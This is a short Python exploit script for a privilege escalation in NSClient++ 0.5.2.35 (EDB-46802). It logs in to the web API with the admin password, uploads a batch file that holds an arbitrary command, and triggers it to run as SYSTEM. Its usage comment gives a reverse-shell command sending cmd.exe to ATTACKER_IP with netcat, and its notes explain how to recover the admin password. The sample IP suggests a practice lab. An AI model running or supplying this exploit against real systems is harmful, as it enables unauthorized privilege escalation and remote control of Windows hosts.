#!/usr/bin/python3
# NSClient++ 0.5.2.35 - Privilege Escalation (EDB-46802) 
# Sources: 
#   - https://www.exploit-db.com/exploits/46802 
#   - https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation/blob/master/exploit.py
#
# Usage:
#   python3 payload.py "C:\temp\nc.exe ATTACKER_IP 1337 -e cmd.exe" https://TARGET_IP:8443 PASSWORD
#
# Notes:
# - Ensure `nc.exe` is present on the target (upload if missing)
# - Target: NSClient++ 0.5.2.35 with Web Server enabled
#     (check with: C:\Program Files\NSClient++> nscp --version  # should show 0.5.2.35)
# - Requires admin web password
#     (found in nsclient.ini or via: C:\Program Files\NSClient++> nscp web --password --display)
# - You may need port forwarding to reach the web interface
# - Enable the following modules in config:
#        1. CheckExternalScripts
#        2. Scheduler
# - A reboot (or service restart) may be needed for the schedule to run
import requests
import argparse


parser = argparse.ArgumentParser(description='NSClient++ 0.5.2.35 - Auth Privilege Escalation (EDB-46802)')
parser.add_argument("command", help="Command to run on victim machine")
parser.add_argument("host", help="Target host + port, e.g. https://10.129.250.121:8443")
parser.add_argument("password", help="NSClient++ admin's password")
args = parser.parse_args()
# Upload malicious script
url_put = args.host + "/api/v1/scripts/ext/scripts/exploit.bat"
r = requests.put(url_put, data=args.command, verify=False, auth=("admin", args.password))
print("[+] Upload script:", r.status_code)

url_exec = args.host + "/api/v1/queries/exploit/commands/execute?time=1m"
r = requests.get(url_exec, verify=False, auth=("admin", args.password))
print("[+] Trigger schedule:", r.status_code)
